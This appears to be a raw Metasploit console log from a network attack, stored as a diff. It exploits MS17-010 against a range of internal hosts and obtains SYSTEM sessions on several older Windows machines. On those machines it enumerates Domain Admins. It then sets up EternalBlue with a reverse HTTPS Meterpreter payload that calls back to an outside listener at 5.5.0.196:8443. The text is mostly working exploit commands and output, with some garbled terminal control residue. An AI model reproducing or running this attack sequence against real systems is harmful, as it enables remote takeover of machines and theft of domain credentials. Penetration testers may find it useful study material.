+   windows/x64/meterpreter/reverse_winhttps                             normal  Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
+   windows/x64/meterpreter_bind_named_pipe                              normal  Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
+   windows/x64/meterpreter_bind_tcp                                     normal  Windows Meterpreter Shell, Bind TCP Inline (x64)
+   windows/x64/meterpreter_reverse_http                                 normal  Windows Meterpreter Shell, Reverse HTTP Inline (x64)
+   windows/x64/meterpreter_reverse_https                                normal  Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
+   windows/x64/meterpreter_reverse_ipv6_tcp                             normal  Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
+   windows/x64/meterpreter_reverse_tcp                                  normal  Windows Meterpreter Shell, Reverse TCP Inline x64
+   windows/x64/powershell_bind_tcp                                      normal  Windows Interactive Powershell Session, Bind TCP
+   windows/x64/powershell_reverse_tcp                                   normal  Windows Interactive Powershell Session, Reverse TCP
+   windows/x64/shell/bind_ipv6_tcp                                      normal  Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager
+   windows/x64/shell/bind_ipv6_tcp_uuid                                 normal  Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support
+   windows/x64/shell/bind_named_pipe                                    normal  Windows x64 Command Shell, Windows x64 Bind Named Pipe Stager
+   windows/x64/shell/bind_tcp                                           normal  Windows x64 Command Shell, Windows x64 Bind TCP Stager
+   windows/x64/shell/bind_tcp_uuid                                      normal  Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)
+   windows/x64/shell/reverse_tcp                                        normal  Windows x64 Command Shell, Windows x64 Reverse TCP Stager
+   windows/x64/shell/reverse_tcp_uuid                                   normal  Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)
+   windows/x64/shell_bind_tcp                                           normal  Windows x64 Command Shell, Bind TCP Inline
+   windows/x64/shell_reverse_tcp                                        normal  Windows x64 Command Shell, Reverse TCP Inline
+   windows/x64/vncinject/bind_ipv6_tcp                                  normal  Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager
+   windows/x64/vncinject/bind_ipv6_tcp_uuid                             normal  Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager with UUID Support
+   windows/x64/vncinject/bind_named_pipe                                normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Bind Named Pipe Stager
+   windows/x64/vncinject/bind_tcp                                       normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Bind TCP Stager
+   windows/x64/vncinject/bind_tcp_uuid                                  normal  Windows x64 VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x64)
+   windows/x64/vncinject/reverse_http                                   normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
+   windows/x64/vncinject/reverse_https                                  normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
+   windows/x64/vncinject/reverse_tcp                                    normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
+   windows/x64/vncinject/reverse_tcp_uuid                               normal  Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
+   windows/x64/vncinject/reverse_winhttp                                normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
+   windows/x64/vncinject/reverse_winhttps                               normal  Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
+
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> show payloads[K
+[0m[1m[31m[-][0m Invalid parameter "payload", use "show -h" for more information
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> exploit
+[0m
+[1m[34m[*][0m 10.20.31.10:445       - Target OS: Unix
+[1m[31m[-][0m 10.20.31.10:445       - Exploit unavailable for target OS.
+[1m[34m[*][0m 10.20.31.71:445       - Target OS: Windows 6.1
+[1m[31m[-][0m 10.20.31.71:445       - Exploit unavailable for target OS.
+[1m[34m[*][0m 10.100.101.6:445      - Target OS: Windows 7 Enterprise 7600
+[1m[31m[-][0m 10.100.101.6:445      - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.100.101.31:445     - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.101.31:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.101.31:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.31:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.101.31:445     - 		[*] Trying stick 1 (x86)...Boom!
+[1m[34m[*][0m 10.100.101.31:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.101.31:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.101.31:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.31:445     - Reading from CONNECTION struct at: 0x81cd02b0
+[1m[34m[*][0m 10.100.101.31:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.101.31:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.101.31:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.101.31:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain alpha.net.
+
+
+[1m[32m[+][0m 10.100.101.31:445     - Cleanup was successful
+[1m[34m[*][0m Scanned  4 of 40 hosts (10% complete)
+[1m[34m[*][0m 10.100.101.55:445     - Target OS: Unix
+[1m[31m[-][0m 10.100.101.55:445     - Exploit unavailable for target OS.
+[1m[34m[*][0m 10.100.101.90:445     - Target OS: Windows Server 2003 R2 3790 Service Pack 1
+[1m[34m[*][0m 10.100.101.90:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.101.90:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.90:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.101.90:445     - 		Trying stick 1 (x64)...Miss
+[1m[34m[*][0m 10.100.101.90:445     - 		[*] Trying stick 2 (x86)...Boom!
+[1m[34m[*][0m 10.100.101.90:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.101.90:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.101.90:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.90:445     - Reading from CONNECTION struct at: 0x85832d48
+[1m[34m[*][0m 10.100.101.90:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.101.90:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.101.90:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.101.90:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain WORKGROUP.
+
+
+[1m[32m[+][0m 10.100.101.90:445     - Cleanup was successful
+[1m[34m[*][0m 10.100.101.99:445     - Target OS: Windows 6.1
+[1m[31m[-][0m 10.100.101.99:445     - Exploit unavailable for target OS.
+[1m[31m[-][0m 10.100.101.118:445    - Rex::Proto::SMB::Exceptions::LoginError: Login Failed: The server responded with error: STATUS_ACCESS_DENIED (Command=115 WordCount=0)
+[1m[34m[*][0m Scanned  8 of 40 hosts (20% complete)
+[1m[34m[*][0m 10.100.101.228:445    - Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
+[1m[34m[*][0m 10.100.101.228:445    - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.101.228:445    - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.228:445    - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.101.228:445    - 		[*] Trying stick 1 (x64)...Boom!
+[1m[34m[*][0m 10.100.101.228:445    - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.101.228:445    - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.101.228:445    - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.228:445    - Reading from CONNECTION struct at: 0xfffffa80055adba0
+[1m[34m[*][0m 10.100.101.228:445    - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.101.228:445    - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.101.228:445    - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.101.228:445    - Output for "net group "Domain Admins" /domain":
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.101.228:445    - Cleanup was successful
+[1m[34m[*][0m 10.100.101.246:445    - Target OS: Windows 7 Enterprise 7600
+[1m[31m[-][0m 10.100.101.246:445    - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.100.103.31:445     - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.103.31:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.103.31:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.31:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.103.31:445     - 		[*] Trying stick 1 (x86)...Boom!
+[1m[34m[*][0m 10.100.103.31:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.103.31:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.103.31:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.31:445     - Reading from CONNECTION struct at: 0x81f03618
+[1m[34m[*][0m 10.100.103.31:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.103.31:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.103.31:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.103.31:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain gamma.net.
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.103.31:445     - Cleanup was successful
+[1m[31m[-][0m 10.100.103.74:445     - Rex::ConnectionTimeout: The connection timed out (10.100.103.74:445).
+[1m[34m[*][0m Scanned 12 of 40 hosts (30% complete)
+[1m[34m[*][0m 10.100.103.90:445     - Target OS: Windows Server 2003 R2 3790 Service Pack 1
+[1m[34m[*][0m 10.100.103.90:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.103.90:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.90:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.103.90:445     - 		Trying stick 1 (x64)...Miss
+[1m[34m[*][0m 10.100.103.90:445     - 		[*] Trying stick 2 (x86)...Boom!
+[1m[34m[*][0m 10.100.103.90:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.103.90:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.103.90:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.90:445     - Reading from CONNECTION struct at: 0x858cfd48
+[1m[34m[*][0m 10.100.103.90:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.103.90:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.103.90:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.103.90:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain gamma.net.
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.103.90:445     - Cleanup was successful
+[1m[34m[*][0m 10.100.103.99:445     - Target OS: Windows 6.1
+[1m[31m[-][0m 10.100.103.99:445     - Exploit unavailable for target OS.
+[1m[31m[-][0m 10.100.103.118:445    - Rex::Proto::SMB::Exceptions::LoginError: Login Failed: The server responded with error: STATUS_ACCESS_DENIED (Command=115 WordCount=0)
+[1m[34m[*][0m 10.100.103.144:445    - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.103.144:445    - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.103.144:445    - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.144:445    - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.103.144:445    - 		[*] Trying stick 1 (x86)...Boom!
+[1m[34m[*][0m 10.100.103.144:445    - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.103.144:445    - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.103.144:445    - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.144:445    - Reading from CONNECTION struct at: 0x81fea7f8
+[1m[34m[*][0m 10.100.103.144:445    - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.103.144:445    - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.103.144:445    - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.103.144:445    - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain gamma.net.
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            
+The command completed successfully.
+
+
+[1m[32m[+][0m 10.100.103.144:445    - Cleanup was successful
+[1m[34m[*][0m Scanned 16 of 40 hosts (40% complete)
+[1m[34m[*][0m 10.100.103.228:445    - Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
+[1m[34m[*][0m Caught interrupt from the console...
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> show options
+[0m
+Module options (auxiliary/admin/smb/ms17_010_command):
+
+   Name                  Current Setting                                Required  Description
+   ----                  ---------------                                --------  -----------
+   COMMAND               net group "Domain Admins" /domain              yes       The command you want to execute on the remote host
+   DBGTRACE              false                                          yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                             yes       How many times to try to leak transaction
+   NAMEDPIPE                                                            no        A named pipe that can be connected to (leave blank for auto)
+   RHOSTS                file:/tmp/msf-db-rhosts-20180318-13075-8axwti  yes       The target address range or CIDR identifier
+   RPORT                 445                                            yes       The Target port
+   SERVICE_DESCRIPTION                                                  no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                 no        The service display name
+   SERVICE_NAME                                                         no        The service name
+   SMBDomain             .                                              no        The Windows domain to use for authentication
+   SMBPass                                                              no        The password for the specified username
+   SMBSHARE              C$                                             yes       The name of a writeable share on the server
+   SMBUser                                                              no        The username to authenticate as
+   THREADS               1                                              yes       The number of concurrent threads
+   WINPATH               WINDOWS                                        yes       The name of the remote Windows directory
+
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> search blue[K[K[K[Keternal
+[0m
+Matching Modules
+================
+
+   Name                                      Disclosure Date  Rank     Description
+   ----                                      ---------------  ----     -----------
+   auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection
+   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+
+
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> use exploit/windows/smb/ms17_010_eternalblue
+[0m[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set payload windows/x64/meterpreter/reverse_https
+[0mpayload => windows/x64/meterpreter/reverse_https
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set LHOST 5.5.0.196
+[0mLHOST => 5.5.0.196
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set LHOST 5.5.0.196payload windows/x64/meterpreter/reverse_https[P[P[P[P[Puse exploit/windows/smb/ms17_010_eternalbluesearch eternal[K[P[Phow options[P[P[P[Pessions[Pexploitshow payloadsadvanced[Poptionset LHOST 5.5.0.196payload windows/x64/meterpreter/reverse_httpsifconfig[Kset payload windows/x64/meterpreter/reverse_httpspayload[Kssessions[P[P[P[P[Prunspool eternalblue.log[P[P[P[P[P[P[P[P[Phow optionservices -p 445 -Rr[K[P445use auxiliary/admin/smb/ms17_010_command[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psearch eternal[P[P[Pscanrvices -p 445 -R[P[P[Phost[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[Pcd vulnsdb_nmap -sV -p443 -vv -n --script=ssl-heartbleed -iL /tmp/msf-db-rhosts-20180318-10755-kp1qev[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P-script-help=ssl-heartbleednmap --script-help=ssl-heartbleed[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cservices -p 443 -R[K[KS[C[C[C[Chttp -R[P[P[P[P[P[P[P[P[P[P[Phosts[C[C[Cservices -S httpopens[C[C[C[C[C[Khosts -o msf-hosts.csv[Kdb_export -f xml workspace.xmlset RHO[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kset RHOST 10.100.103.144
+[0mRHOST => 10.100.103.144
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show options
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name                Current Setting  Required  Description
+   ----                ---------------  --------  -----------
+   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
+   GroomDelta          5                yes       The amount to increase the groom count by per try.
+   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
+   ProcessName         spoolsv.exe      yes       Process to inject payload into.
+   RHOST               10.100.103.144   yes       The target address
+   RPORT               445              yes       The target port (TCP)
+   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                              no        (Optional) The password for the specified username
+   SMBUser                              no        (Optional) The username to authenticate as
+   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
+   VerifyTarget        true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_https):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     5.5.0.196        yes       The local listener hostname
+   LPORT     8443             yes       The local listener port
+   LURI                       no        The HTTP Path
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show adbanced[K[K[K[K[K[K[K[K[K[K[K[K[Kset LPORT 4000[K[K[K[K[K[K[K[K[K[K[K[K[K[Kshow advanced
+[0m
+Module advanced options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name                    Current Setting  Required  Description
+   ----                    ---------------  --------  -----------
+   CHOST                                    no        The local client address
+   CPORT                                    no        The local client port
+   ConnectTimeout          10               yes       Maximum number of seconds to establish a TCP connection
+   ContextInformationFile                   no        The information file that contains context information
+   DCERPC::ReadTimeout     10               yes       The number of seconds to wait for DCERPC responses
+   DisablePayloadHandler   false            no        Disable the handler code for the selected payload
+   EnableContextEncoding   false            no        Use transient context when encoding payloads
+   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
+   SSL                     false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCipher                                no        String for SSL cipher - "DHE-RSA-AES256-SHA" or "ADH"
+   SSLVerifyMode           PEER             no        SSL verification method (Accepted: CLIENT_ONCE, FAIL_IF_NO_PEER_CERT, NONE, PEER)
+   SSLVersion              Auto             yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, TLS1, TLS1.2, TLS1.1, SSL23)
+   VERBOSE                 false            no        Enable detailed status messages
+   WORKSPACE                                no        Specify the workspace for this module
+   WfsDelay                5                no        Additional delay when waiting for a session
+
+
+Payload advanced options (windows/x64/meterpreter/reverse_https):
+
+   Name                         Current Setting                                                Required  Description
+   ----                         ---------------                                                --------  -----------
+   AutoLoadStdapi               true                                                           yes       Automatically load the Stdapi extension
+   AutoRunScript                                                                               no        A script to run automatically on session creation.
+   AutoSystemInfo               true                                                           yes       Automatically capture system information on initialization.
+   AutoVerifySession            true                                                           yes       Automatically verify and drop invalid sessions
+   AutoVerifySessionTimeout     30                                                             no        Timeout period to wait for session validation to occur, in seconds
+   EnableStageEncoding          false                                                          no        Encode the second stage payload
+   EnableUnicodeEncoding        false                                                          yes       Automatically encode UTF-8 strings as hexadecimal
+   HandlerSSLCert                                                                              no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
+   HttpCookie                                                                                  no        An optional value to use for the Cookie HTTP header
+   HttpHostHeader                                                                              no        An optional value to use for the Host HTTP header
+   HttpProxyHost                                                                               no        An optional proxy server IP address or hostname
+   HttpProxyPass                                                                               no        An optional proxy server password
+   HttpProxyPort                                                                               no        An optional proxy server port
+   HttpProxyType                HTTP                                                           yes       The type of HTTP proxy (Accepted: HTTP, SOCKS)
+   HttpProxyUser                                                                               no        An optional proxy server username
+   HttpReferer                                                                                 no        An optional value to use for the Referer HTTP header
+   HttpServerName               Apache                                                         no        The server header that the handler will send in response to requests
+   HttpUnknownRequestResponse   <html><body><h1>It works!</h1></body></html>                   no        The returned HTML response body when the handler receives a request that is not from a payload
+   HttpUserAgent                Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko  no        The user-agent that the payload should use for communication
+   IgnoreUnknownPayloads        false                                                          yes       Whether to drop connections from payloads using unknown UUIDs
+   InitialAutoRunScript                                                                        no        An initial script to run on session creation (before AutoRunScript)
+   OverrideLHOST                                                                               no        When OverrideRequestHost is set, use this value as the host name for secondary requests
+   OverrideLPORT                                                                               no        When OverrideRequestHost is set, use this value as the port number for secondary requests
+   OverrideRequestHost          false                                                          yes       Forces a specific host and port instead of using what the client requests, defaults to LHOST:LPORT
+   OverrideScheme                                                                              no        When OverrideRequestHost is set, use this value as the scheme for secondary requests, e.g http or https
+   PayloadProcessCommandLine                                                                   no        The displayed command line that will be used by the payload
+   PayloadUUIDName                                                                             no        A human-friendly name to reference this unique payload (requires tracking)
+   PayloadUUIDRaw                                                                              no        A hex string representing the raw 8-byte PUID value for the UUID
+   PayloadUUIDSeed                                                                             no        A string to use when generating the payload UUID (deterministic)
+   PayloadUUIDTracking          false                                                          yes       Whether or not to automatically register generated UUIDs
+   PrependMigrate               false                                                          yes       Spawns and runs shellcode in new process
+   PrependMigrateProc                                                                          no        Process to spawn and run shellcode in
+   ReverseAllowProxy            false                                                          yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
+   ReverseListenerBindAddress                                                                  no        The specific IP address to bind to on the local system
+   ReverseListenerBindPort                                                                     no        The port to bind to on the local system if different from LPORT
+   SessionCommunicationTimeout  300                                                            no        The number of seconds of no activity before this session should be killed
+   SessionExpirationTimeout     604800                                                         no        The number of seconds before this session should be forcibly shut down
+   SessionRetryTotal            3600                                                           no        Number of seconds try reconnecting for on network failure
+   SessionRetryWait             10                                                             no        Number of seconds to wait between reconnect attempts
+   StageEncoder                                                                                no        Encoder to use if EnableStageEncoding is set
+   StageEncoderSaveRegisters                                                                   no        Additional registers to preserve in the staged payload if EnableStageEncoding is set
+   StageEncodingFallback        true                                                           no        Fallback to no encoding if the selected StageEncoder is not compatible
+   StagerRetryCount             10                                                             no        The number of times the stager should retry if the first connect fails
+   StagerRetryWait              5                                                              no        Number of seconds to wait for the stager between reconnect attempts
+   StagerURILength                                                                             no        The URI length for the stager (at least 5 bytes)
+   StagerVerifySSLCert          false                                                          no        Whether to verify the SSL certificate in Meterpreter
+   VERBOSE                      false                                                          no        Enable detailed status messages
+   WORKSPACE                                                                                   no        Specify the workspace for this module
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show options
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name                Current Setting  Required  Description
+   ----                ---------------  --------  -----------
+   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
+   GroomDelta          5                yes       The amount to increase the groom count by per try.
+   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
+   ProcessName         spoolsv.exe      yes       Process to inject payload into.
+   RHOST               10.100.103.144   yes       The target address
+   RPORT               445              yes       The target port (TCP)
+   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                              no        (Optional) The password for the specified username
+   SMBUser                              no        (Optional) The username to authenticate as
+   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
+   VerifyTarget        true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_https):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     5.5.0.196        yes       The local listener hostname
+   LPORT     8443             yes       The local listener port
+   LURI                       no        The HTTP Path
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set run[K[K[K[K[K[K[Kexploit
+[0m
+[1m[34m[*][0m Started HTTPS reverse handler on https://5.5.0.196:8443
+[1m[34m[*][0m 10.100.103.144:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 10.100.103.144:445 - Connection established for exploitation.
+[1m[33m[!][0m 10.100.103.144:445 - Target OS selected not valid for OS indicated by SMB reply
+[1m[33m[!][0m 10.100.103.144:445 - Disable VerifyTarget option to proceed manually...
+[1m[31m[-][0m 10.100.103.144:445 - Unable to continue with improper OS Target.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set RHOST 10.100.103.90
+[0mRHOST => 10.100.103.90
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set RHOST 10.100.103.90exploit[K
+[0m
+[1m[34m[*][0m Started HTTPS reverse handler on https://5.5.0.196:8443
+[1m[34m[*][0m 10.100.103.90:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 10.100.103.90:445 - Connection established for exploitation.
+[1m[33m[!][0m 10.100.103.90:445 - Target OS selected not valid for OS indicated by SMB reply
+[1m[33m[!][0m 10.100.103.90:445 - Disable VerifyTarget option to proceed manually...
+[1m[31m[-][0m 10.100.103.90:445 - Unable to continue with improper OS Target.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show targets
+[0m
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> search eternal
+[0m
+Matching Modules
+================
+
+   Name                                      Disclosure Date  Rank     Description
+   ----                                      ---------------  ----     -----------
+   auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection
+   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> use [K[K[K[Kinfo exploit/windows/smb/ms17_010_psexec
+[0m
+       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+     Module: exploit/windows/smb/ms17_010_psexec
+   Platform: Windows
+       Arch: x86, x64
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+  Disclosed: 2017-03-14
+
+Provided by:
+  sleepya
+  zerosum0x0
+  Shadow Brokers
+  Equation Group
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic
+  1   PowerShell
+  2   Native upload
+  3   MOF upload
+
+Basic options:
+  Name                  Current Setting  Required  Description
+  ----                  ---------------  --------  -----------
+  DBGTRACE              false            yes       Show extra debug trace info
+  LEAKATTEMPTS          99               yes       How many times to try to leak transaction
+  NAMEDPIPE                              no        A named pipe that can be connected to (leave blank for auto)
